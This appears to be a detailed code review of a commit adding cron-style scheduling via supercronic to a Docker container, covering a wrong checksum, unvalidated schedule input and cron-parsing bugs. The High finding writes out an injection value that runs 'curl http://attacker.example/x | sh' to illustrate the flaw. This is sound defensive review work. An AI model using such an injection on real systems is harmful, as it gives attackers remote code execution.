# Code Review: aa259fc — feat: recurring execution with supercronic scheduler

## Summary

This commit turns the container from a strictly one-shot job into a "run once or run forever" service by adding `entrypoint.sh` (branches on `SCHEDULE` between exec'ing `update_music_metadata.sh` directly or generating a crontab for the `supercronic` scheduler), installing `supercronic` in the `Dockerfile` via a pinned-version download with a SHA1 integrity check, documenting the new `SCHEDULE` env var in `docker-compose.yml`, and adding a standalone `schedule_utils.py` with cron-expression validation plus 6 unit tests. The overall direction (pinned binary + checksum verification, conservative one-shot-by-default behavior, clear docs) is sound, but the implementation as committed has one build-breaking defect and one significant, verifiable security gap: the hardcoded SHA1 checksum does not match the actual official checksum for the pinned `supercronic` release (verified by downloading the real artifact), so `docker build` cannot succeed as committed; and `schedule_utils.validate_cron_expression()` is written and unit-tested but never invoked from `entrypoint.sh`, so the `SCHEDULE` value is written into the crontab file completely unvalidated, including no check that it has exactly 5 fields, which opens a command-injection-shaped hole in the generated cron line. Neither defect is exercised by the 6 new tests, both of which live in the untestable shell/Docker layer explicitly called out as a coverage gap below.

## Files Changed

- `Dockerfile` — installs `curl`, downloads `supercronic` v0.2.29 (linux-amd64) from GitHub releases with a `sha1sum -c` integrity check, copies `entrypoint.sh` + `tagging_modes.py` + `metadata_fallback.py` into the image, adds `SCHEDULE=""` default env var, switches `ENTRYPOINT` from `update_music_metadata.sh` to the new `entrypoint.sh`.
- `docker-compose.yml` — documents one-shot vs. recurring usage with concrete `SCHEDULE` cron examples, threads `SCHEDULE` through as an environment variable, adds commented-out examples for other tunables (`SCAN_WORKERS`, `TAGGING_MODE`, `WEBHOOK_URL`).
- `entrypoint.sh` (new) — container entrypoint: one-shot mode execs `update_music_metadata.sh` directly when `SCHEDULE` is unset/empty; recurring mode writes a crontab file combining `$SCHEDULE` with the script path and execs `supercronic` against it.
- `schedule_utils.py` (new) — `validate_cron_expression()` (character-set + per-field numeric-range checks) and `describe_cron_expression()` (human-readable summary), plus a `__main__` self-test block.
- `tests/test_schedule_utils.py` (new) — 6 tests covering valid schedules, malformed field counts, out-of-range values, and description generation.

## Findings

### Critical

1. **The pinned `supercronic` checksum is wrong — the image as committed cannot build.** `Dockerfile:25-32`:
   ```dockerfile
   ENV SUPERCRONIC_URL=https://github.com/aptible/supercronic/releases/download/v0.2.29/supercronic-linux-amd64 \
       SUPERCRONIC=supercronic-linux-amd64 \
       SUPERCRONIC_SHA1=ecb3f9ad06e989e01d25da6f11b85e60cb844e35

   RUN curl -fsSLO "$SUPERCRONIC_URL" \
       && echo "${SUPERCRONIC_SHA1}  ${SUPERCRONIC}" | sha1sum -c - \
       && chmod +x "$SUPERCRONIC" \
       && mv "$SUPERCRONIC" /usr/local/bin/supercronic
   ```
   I downloaded the actual `v0.2.29` `supercronic-linux-amd64` asset from GitHub and computed its checksum directly: `sha1sum` = `cd48d45c4b10f3f0bfdd3a57d054cd05ac96812b`. This matches the checksum published in aptible/supercronic's own v0.2.29 release notes ("Installation Instructions" section: `SUPERCRONIC_SHA1SUM=cd48d45c4b10f3f0bfdd3a57d054cd05ac96812b`) verbatim. The value hardcoded in this commit, `ecb3f9ad06e989e01d25da6f11b85e60cb844e35`, is neither the correct checksum for this asset/version nor a recognizable checksum for any other published `supercronic` asset I checked — it appears to be a typo or a stray value from an unrelated source.
   - **Concrete failure scenario:** `docker compose up --build` (or any `docker build .`) fails at the `sha1sum -c -` step with `supercronic-linux-amd64: FAILED` / `WARNING: 1 computed checksum did NOT match`, and because the `RUN` instruction chains with `&&`, the whole `RUN` (and thus the build) aborts non-zero. The commit message's claim "Impact: Production-ready 'Set-and-forget' deployment" is not true as shipped — the image cannot be produced at all, one-shot or recurring.
   - On the positive side, this is a fail-closed bug (a build failure, not a silently-installed-tampered-binary), which at least confirms the verification mechanism itself would catch a real substitution attack. But it must be fixed before this is usable.
   - **Fix:** set `SUPERCRONIC_SHA1=cd48d45c4b10f3f0bfdd3a57d054cd05ac96812b` (verified against the official v0.2.29 release), and add a CI step that actually runs `docker build .` so a checksum/version drift like this fails CI instead of only being discovered when someone tries to deploy.

### High

1. **`validate_cron_expression()` is never called by `entrypoint.sh` — `SCHEDULE` reaches the crontab file completely unvalidated, including field-count, which is a shell/cron-injection-shaped gap.** `entrypoint.sh:36-46`:
   ```bash
   else
     # Recurring mode: setup supercronic
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] Running in recurring mode with schedule: $SCHEDULE"

     # Create a crontab file for supercronic
     CRONTAB_FILE="$WORK_DIR/crontab"
     cat > "$CRONTAB_FILE" <<EOF
   # Crontab for music metadata updater
   # Schedule: $SCHEDULE
   $SCHEDULE $SCRIPT_DIR/update_music_metadata.sh
   EOF
   ```
   There is no call to `schedule_utils.validate_cron_expression()` (or any equivalent check) anywhere in `entrypoint.sh` — confirmed by grepping the file for `schedule_utils`/`python3` (no matches). The module and its 6 tests only run under pytest; in the actual container start path, `$SCHEDULE` is interpolated straight into the generated crontab line with zero field-count or character validation.
   - **Concrete failure scenario:** `validate_cron_expression()` explicitly rejects any value that doesn't split into exactly 5 whitespace-separated fields (`schedule_utils.py:26-27`), but that check is dead code at runtime. If `SCHEDULE` is set to something with extra tokens after the 5 legitimate cron fields — e.g. `SCHEDULE='* * * * * ; curl http://attacker.example/x | sh #'` — the generated crontab line becomes:
     ```
     * * * * * ; curl http://attacker.example/x | sh # /app/update_music_metadata.sh
     ```
     `supercronic` parses the first 5 whitespace tokens as the schedule and treats everything after as the shell command to execute (via `sh -c`) on that schedule — i.e. the injected command runs every minute, and the trailing `#` comments out the real script invocation. `SCHEDULE` is operator-supplied today (an env var in `docker-compose.yml`/`.env`), so this is not remotely exploitable by an anonymous attacker in the current deployment shape, but it is exactly the class of input the already-written `validate_cron_expression()` was built to catch, and it is disconnected from the one place that needed it. If a later commit in this series exposes `SCHEDULE` through any less-trusted surface (a web form, an API, a templated config pulled from another system), this becomes directly exploitable with no additional code change required on the vulnerable side.
   - Independent of the injection angle, skipping validation also means a simple operator typo (`SCHEDULE="0 2 * *"`, 4 fields) is not caught at container startup with a clear message — it's silently written to the crontab file and only fails later, opaquely, inside `supercronic`'s own parser.
   - **Fix:** before writing the crontab file, validate `$SCHEDULE` — e.g. `python3 -c "import sys, schedule_utils as su; ok, err = su.validate_cron_expression(sys.argv[1]); sys.exit(0 if ok else (print(err, file=sys.stderr) or 1))" "$SCHEDULE"` — and `exit 1` with a clear error if it fails, before ever reaching the `cat > "$CRONTAB_FILE"` step. This closes both the injection surface (field-count is enforced) and the "confusing runtime failure" problem.

### Medium

1. **`restart: "no"` for recurring mode contradicts the "set-and-forget" claim; a crash or host reboot silently and permanently stops the schedule.** `docker-compose.yml:39-41`:
   ```yaml
   # For one-shot: restart: "no"
   # For recurring: restart: "no" (supercronic handles the loop inside)
   restart: "no"
   ```
   The comment conflates "supercronic handles the recurring-loop scheduling" with "the deployment is resilient" — it doesn't handle resilience at all. If the container OOMs, `supercronic` itself crashes, or the Docker host reboots, the container simply stays stopped; there is nothing in this commit that restarts it, and nothing that alerts an operator that the schedule is no longer running. For a feature whose commit message explicitly advertises "Production-ready 'Set-and-forget' deployment," this is a meaningful gap between the marketing and the actual operational guarantee.
   - **Fix:** use `restart: unless-stopped` (or `on-failure`) specifically for the recurring use case, or at minimum replace the misleading comment with an explicit callout that recurring mode has no crash-recovery and operators should pair it with an external supervisor (systemd, Docker health checks + `restart: always`, etc.) if that matters to them.

2. **`schedule_utils.py`'s range/list/step validation is materially weaker than its own docstring and inline comment claim, and would accept structurally invalid cron fields.** `schedule_utils.py:17,39,48-59`:
   ```python
   # Check ranges (simplified)
   ...
   for field, (field_name, (min_val, max_val)) in \
       zip(parts, ranges.items()):
       if field == '*':
           continue
       # Extract all numbers
       numbers = re.findall(r'\d+', field)
       for num_str in numbers:
           num = int(num_str)
           if num < min_val or num > max_val:
               return False, f"{field_name} value {num} out of range [{min_val}, {max_val}]"
   ```
   The docstring says "Supports: `*` `/` `,` `-` ranges," implying structural understanding of ranges/lists/steps, but the implementation only (a) whitelists the character set via `valid_chars` (`schedule_utils.py:32`), and (b) extracts every digit run in the field with `re.findall(r'\d+', field)` and checks each in isolation against the field's bounds — it never checks that a range's start ≤ end, that separators are well-formed, or that the field is a single coherent expression. Concretely, all of the following pass `validate_cron_expression()` today despite being nonsensical cron syntax: `"50-10 * * * *"` (reversed range — accepted since 50 and 10 are each individually in `[0,59]`), `"5-10-15 * * * *"` (three numbers joined by two hyphens — each of 5, 10, 15 is in range, so it's accepted), `"1,,2 * * * *"` (double comma), `"1,2, * * * *"` (trailing comma). None of these are caught, contrary to what "Supports: ... ranges" implies.
   - **Fix:** validate list (`,`)/range (`-`)/step (`/`) structure explicitly per sub-token (e.g. split on `,`, then for each sub-token split on `/` and validate the base as either `*` or a single number or a well-formed `a-b` range with `a <= b`), rather than relying on a flat "every digit found anywhere in the field is individually in range" check. Add tests for the malformed cases above.

3. **`describe_cron_expression()`'s weekday branch is a buggy substring check that silently drops information for the exact kind of schedule the commit's own tests call "valid."** `schedule_utils.py:96-99`:
   ```python
   weekday_names = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday']
   if weekday != '*':
       if weekday in '0123456':
           descriptions.append(f"on {weekday_names[int(weekday)]}")
   ```
   `weekday in '0123456'` is a Python substring check against the literal string `"0123456"`, not "is `weekday` a single valid digit 0–6." For `weekday == "1-5"` (a value `tests/test_schedule_utils.py:test_validate_cron_expression_valid` explicitly asserts is *valid* via the schedule `"30 14 * * 1-5"`), `"1-5" in "0123456"` is `False`, so `describe_cron_expression("30 14 * * 1-5")` silently omits any mention of weekdays instead of describing "Monday through Friday" — no error, just a quietly incomplete description. The check is also incidentally fragile for multi-character values in general (e.g. `"12" in "0123456"` happens to be `True` because "12" appears contiguously inside "0123456", even though 12 is not itself meaningful here); this particular case is masked because `validate_cron_expression` would reject weekday `12` as out-of-range before `describe` is reached, but it illustrates the check isn't doing what it looks like it's doing.
   - Not exercised by any test — `test_describe_cron_expression` only uses `"0 2 * * *"` (weekday `*`), so the range-weekday path was never exercised.
   - **Fix:** replace with something that actually checks "is this a plain single digit 0-6," e.g. `if weekday.isdigit() and weekday in [str(i) for i in range(7)]`, and add an explicit (documented, even if not fully implemented) fallback description for list/range weekday values instead of silently dropping them.

### Low / Nitpicks

1. **`entrypoint.sh` uses only `set -e`, inconsistent with the rest of the codebase.** `entrypoint.sh:17` vs. `update_music_metadata.sh` (pre-existing), which uses `set -euo pipefail`. Without `-u`, a typo'd variable reference silently expands to empty instead of failing fast; without `-o pipefail`, a failure in the middle of any future piped command in this file would be masked. Align with the existing convention for consistency and defense-in-depth.

2. **Dockerfile comment for `curl` is slightly incomplete.** `Dockerfile:15` ("`- curl -> for webhook notifications`") describes only the runtime justification (used by `update_music_metadata.sh`'s pre-existing `WEBHOOK_URL` feature); it omits that this same `RUN apt-get install` step is also a prerequisite for the very next `RUN` block in this file, which uses `curl` to fetch the `supercronic` binary at build time. Minor, documentation-only.

3. **No `-passthrough-logs`/log-format flag passed to `supercronic`.** `entrypoint.sh:52` (`exec supercronic "$CRONTAB_FILE"`) relies on supercronic's default log wrapping (JSON-ish, timestamped per-job-run log lines) rather than the plain `tee`-based logging convention `update_music_metadata.sh` already uses elsewhere in this project. Not a defect, but worth a deliberate choice/comment if operators are expected to `docker logs` this container and grep for familiar output.

4. **`schedule_utils.py`'s field-name/bounds pairing relies on dict-iteration-order coincidence rather than being explicit.** `schedule_utils.py:48-49`:
   ```python
   for field, (field_name, (min_val, max_val)) in \
       zip(parts, ranges.items()):
   ```
   This works only because `ranges` (a `dict`) happens to be defined in the same order as `parts` (`minute, hour, day, month, weekday`); nothing enforces that the two stay in sync if either is reordered later. The clearer and already-available alternative is the same 5-tuple field list used two blocks earlier (`[(minute, 'minute'), (hour, 'hour'), ...]`) — reuse that instead of re-deriving field/name pairing from a dict's insertion order.

5. **`COPY tagging_modes.py` / `COPY metadata_fallback.py` (`Dockerfile:39-40`) ship modules that are not yet reachable from any runtime code path.** As of this commit, `update_music_metadata.sh` and `scan_incomplete.py` contain zero references to `tagging_modes` or `metadata_fallback` (confirmed via grep across all tracked `.py`/`.sh` files at this commit) — the only consumers are their own unit tests (`tests/test_tagging_modes.py`, `tests/test_metadata_fallback.py`). This is an inherited gap from the two prior commits that introduced these modules (02fb807, 67f284d), not something this commit causes, and adding the `COPY` lines here is a reasonable "keep the image in sync with the repo" fix — but it's worth noting the image-completeness improvement doesn't yet translate into new functionality being available in the container.

## Test Coverage Assessment

The 6 new tests in `tests/test_schedule_utils.py` are reasonable for a first pass at the "obviously valid / obviously wrong" happy-path-and-basic-invalid-input space: they check well-formed schedules (including `*/N` steps and a `1-5` range), reject wrong field counts and non-numeric fields, and reject a representative out-of-range value per field. However:

- None of the tests exercise the structurally-malformed-but-individually-in-range inputs identified in Medium #2 above (reversed ranges, double/trailing separators, multi-hyphen chains) — exactly the class of input the "simplified" range check silently mis-handles.
- `test_describe_cron_expression` only covers a `weekday == '*'` schedule, so the substring-check bug in `describe_cron_expression()` (Medium #3) affecting range/list weekday values is untested despite `test_validate_cron_expression_valid` demonstrating that `"30 14 * * 1-5"` is a schedule the module itself considers valid.
- Neither `validate_cron_expression` nor `describe_cron_expression` is tested with a `None` input or non-string type beyond the empty-string case (the `isinstance` check on `schedule_utils.py:21` is effectively untested for non-`""` non-string values, e.g. an `int` or `list`).
- Most importantly, and as expected for shell/Docker-level logic, **there is no test coverage — and no straightforward way to add pytest coverage — for `entrypoint.sh`'s branching, crontab generation/interpolation, or the `Dockerfile`'s download-and-checksum step.** This is precisely where both of this review's most serious findings live (the Critical checksum mismatch and the High validation-not-wired-in gap), and both slipped through purely because nothing exercises that layer. A minimal `docker build .` smoke test in CI, and/or a `bats`/shell-based test that runs `entrypoint.sh` with a few `SCHEDULE` values (valid, empty, malformed, injection-shaped) against a stubbed `supercronic`/`update_music_metadata.sh`, would have caught both issues before merge.

## Positive Notes

- Checksum verification is present at all for a binary fetched from the internet at build time — many equivalent Dockerfiles blindly `curl | chmod +x` with no integrity check; the mechanism and intent here are correct, only the specific hardcoded value is wrong (Critical #1).
- `supercronic` is pinned to an explicit release tag (`v0.2.29`) rather than a floating "latest" URL, avoiding an entire class of supply-chain surprise from upstream publishing a new build under a stable alias.
- `curl` is invoked with sensible flags (`-fsSL`): `-f` makes curl fail non-zero on an HTTP error response instead of silently saving an error page as if it were the binary, which matters for a checksum-gated pipeline like this one.
- One-shot behavior is preserved as the default (`ENV SCHEDULE=""` in the `Dockerfile`, `[ -z "$SCHEDULE" ]` check in `entrypoint.sh`) — existing one-shot deployments that don't set `SCHEDULE` see no behavior change, which is the right backward-compatible default for a feature addition.
- `docker-compose.yml` documentation is genuinely useful: concrete, copy-pasteable examples for daily/every-6-hours/weekly schedules, plus forward-looking commented-out examples for other tunables in one place.
- The one-shot/recurring branch in `entrypoint.sh` is simple and easy to follow, with clear timestamped log lines at each decision point — good for debugging a container that silently does one of two very different things based on an env var.

## Recommendations

1. **(Critical)** Fix `SUPERCRONIC_SHA1` in `Dockerfile:27` to the verified official value `cd48d45c4b10f3f0bfdd3a57d054cd05ac96812b` for `v0.2.29`/`supercronic-linux-amd64`; add a CI job that runs `docker build .` so a future version bump with a stale/wrong checksum fails CI instead of shipping.
2. **(High)** Wire `schedule_utils.validate_cron_expression()` into `entrypoint.sh` before the crontab file is written, and fail fast with a clear error message on invalid input — this both fixes the operator-typo UX and closes the extra-field/command-injection surface in the generated crontab line.
3. **(Medium)** Change `restart: "no"` to `restart: unless-stopped` (or equivalent) for the recurring use case in `docker-compose.yml`, or at minimum rewrite the comment to stop implying crash-resilience that doesn't exist.
4. **(Medium)** Harden `schedule_utils.py`'s field validation to check structural well-formedness of ranges/lists/steps (not just "every digit found anywhere is individually in range"), and add tests for reversed ranges, malformed separators, and non-digit garbage that currently passes the character-set check.
5. **(Medium)** Fix the `weekday in '0123456'` substring bug in `describe_cron_expression()` and add a test using a range/list weekday value (e.g. `"30 14 * * 1-5"`) to catch regressions.
6. **(Low)** Align `entrypoint.sh` with `set -euo pipefail` to match the rest of the codebase's shell conventions.
